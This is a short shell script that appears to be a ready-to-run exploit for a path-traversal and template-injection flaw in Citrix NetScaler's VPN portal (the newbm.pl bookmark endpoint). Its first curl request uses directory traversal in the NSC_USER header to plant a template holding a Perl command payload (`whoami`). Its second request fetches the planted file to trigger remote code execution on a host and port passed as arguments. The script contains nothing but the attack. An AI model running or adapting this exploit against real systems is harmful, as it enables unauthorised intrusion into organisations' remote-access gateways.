#/bin/sh
randomstring=$(python << END
import random
import string
letters = string.ascii_lowercase
print ''.join(random.choice(letters) for i in range(10))
END
)
randomnumber=$(python << END
import random
from random import randint
print randint(5,15)
END
)
filename=$randomstring
nonce=$randomnumber
payload="[% template.new({'BLOCK'='print `whoami`'})%]"
curl -vk -XPOST -H "NSC_USER: ../../../../netscaler/portal/templates/${filename}" -H "NSC_NONCE: ${nonce}" -d "url=http://example.com/&title=${filename}&desc=[% template.new({'BLOCK'='print `whoami`'})%]" --path-as-is "https://${1}:${2}/vpn/../vpns/portal/scripts/newbm.pl" --connect-timeout 10 --retry 5

curl -vk -XGET -H "NSC_USER: ${filename}" -H "NSC_NONCE: ${nonce}" -H "UI_inuse: A" --path-as-is "https://${1}:${2}/vpn/../vpns/portal/${filename}.xml" --connect-timeout 10 --retry 5
echo $1
echo $2
